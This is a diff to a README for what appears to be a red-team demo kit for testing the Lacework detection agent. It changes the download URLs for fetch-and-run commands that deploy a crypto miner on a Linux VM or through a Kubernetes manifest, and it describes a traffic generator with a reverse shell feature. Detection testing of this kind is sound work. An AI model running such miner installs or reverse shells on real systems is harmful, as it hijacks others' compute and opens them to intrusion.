@@ -62,7 +62,7 @@ The Crypto Mining script should be run on a standalone EC2 Instance or Kubernete
   
 ##### Linux VM Deployment
 ```bash
-curl http://lwmalwaredemo.com/install-demo-1.sh -o install-demo-1.sh; sh install-demo-1.sh;
+curl https://raw.githubusercontent.com/tommogs/lw_red_team/main/crypto/install-demo-1.sh -o install-demo-1.sh; sh install-demo-1.sh;
 ```
   
 ##### Kubernetes Deployment
@@ -70,7 +70,7 @@ Deploys a crypto miner malware example for testing the Lacework agent.
   
 Run the following command to deploy the example.  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
+kubectl apply -f https://raw.githubusercontent.com/tommogs/lw_red_team/main/crypto/k8s-crypto-miner.yaml
 ```
   
 Run the following command to delete the example.  
@@ -79,7 +79,7 @@ Run the following command to delete the example.
 kubectl delete -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
 ```
 Here is the script:  
-https://github.com/lacework-dev/scripts/blob/main/k8s-crypto-miner.yaml
+https://github.com/tommogs/lw_red_team/blob/main/crypto/k8s-crypto-miner.yaml
   
 ### 4. Lacework Traffic Generator & Reverse Shell
 This project is a browser based web app designed to allow a user to evaluate Lacework anomaly detection. The nodejs app, when run, generates a baseline amount of activity for Lacework to detect. It also includes a reverse shell feature to allow the tester to trigger anomalous and known-bad alerts commonly seen in real-world breaches.
